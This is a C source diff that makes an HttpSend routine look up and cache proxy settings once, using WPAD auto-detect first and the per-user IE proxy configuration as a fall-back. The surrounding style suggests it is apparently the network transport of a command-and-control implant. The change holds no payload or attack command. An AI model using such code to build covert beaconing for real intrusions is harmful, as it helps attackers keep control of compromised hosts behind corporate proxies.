@@ -149,9 +149,17 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
             }
         }
     }
-    else
+    else if ( ! Instance.LookedForProxy )
     {
         // Autodetect proxy settings using the Web Proxy Auto-Discovery (WPAD) protocol
+
+        /*
+         * NOTE: We use WinHttpGetProxyForUrl as the first option because
+         *       WinHttpGetIEProxyConfigForCurrentUser can fail with certain users
+         *       and also the documentation states that WinHttpGetIEProxyConfigForCurrentUser
+         *       "can be used as a fall-back mechanism" so we are using it that way
+         */
+
         AutoProxyOptions.dwFlags                = WINHTTP_AUTOPROXY_AUTO_DETECT;
         AutoProxyOptions.dwAutoDetectFlags      = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
         AutoProxyOptions.lpszAutoConfigUrl      = NULL;
@@ -161,11 +169,9 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
 
         if ( Instance.Win32.WinHttpGetProxyForUrl( Instance.hHttpSession, HttpEndpoint, &AutoProxyOptions, &ProxyInfo ) )
         {
-            if ( ! Instance.Win32.WinHttpSetOption( hRequest, WINHTTP_OPTION_PROXY, &ProxyInfo, sizeof( ProxyInfo ) ) )
-            {
-                PRINTF( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
-                goto LEAVE;
-            }
+            Instance.SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
+            Instance.ProxyForUrl       = Instance.Win32.LocalAlloc( LPTR, Instance.SizeOfProxyForUrl );
+            MemCopy( Instance.ProxyForUrl, &ProxyInfo, Instance.SizeOfProxyForUrl );
         }
         else
         {
@@ -179,11 +185,13 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
                     ProxyInfo.lpszProxy       = ProxyConfig.lpszProxy;
                     ProxyInfo.lpszProxyBypass = ProxyConfig.lpszProxyBypass;
 
-                    if ( ! Instance.Win32.WinHttpSetOption( hRequest, WINHTTP_OPTION_PROXY, &ProxyInfo, sizeof( ProxyInfo ) ) )
-                    {
-                        PRINTF( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
-                        goto LEAVE;
-                    }
+                    Instance.SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
+                    Instance.ProxyForUrl       = Instance.Win32.LocalAlloc( LPTR, Instance.SizeOfProxyForUrl );
+                    MemCopy( Instance.ProxyForUrl, &ProxyInfo, Instance.SizeOfProxyForUrl );
+
+                    // don't cleanup these values
+                    ProxyConfig.lpszProxy       = NULL;
+                    ProxyConfig.lpszProxyBypass = NULL;
                 }
                 else if ( ProxyConfig.lpszAutoConfigUrl != NULL && StringLengthW( ProxyConfig.lpszAutoConfigUrl ) != 0 )
                 {
@@ -194,11 +202,9 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
 
                     if ( Instance.Win32.WinHttpGetProxyForUrl( Instance.hHttpSession, HttpEndpoint, &AutoProxyOptions, &ProxyInfo ) )
                     {
-                        if ( ! Instance.Win32.WinHttpSetOption( hRequest, WINHTTP_OPTION_PROXY, &ProxyInfo, sizeof( ProxyInfo ) ) )
-                        {
-                            PRINTF( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
-                            goto LEAVE;
-                        }
+                        Instance.SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
+                        Instance.ProxyForUrl       = Instance.Win32.LocalAlloc( LPTR, Instance.SizeOfProxyForUrl );
+                        MemCopy( Instance.ProxyForUrl, &ProxyInfo, Instance.SizeOfProxyForUrl );
                     }
                 }
                 else
@@ -207,6 +213,17 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
                     // ignore this as we already tried
                 }
             }
+        }
+
+        Instance.LookedForProxy = TRUE;
+    }
+
+    if ( Instance.ProxyForUrl )
+    {
+        if ( ! Instance.Win32.WinHttpSetOption( hRequest, WINHTTP_OPTION_PROXY, Instance.ProxyForUrl, Instance.SizeOfProxyForUrl ) )
+        {
+            PRINTF( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
+            goto LEAVE;
         }
     }
 
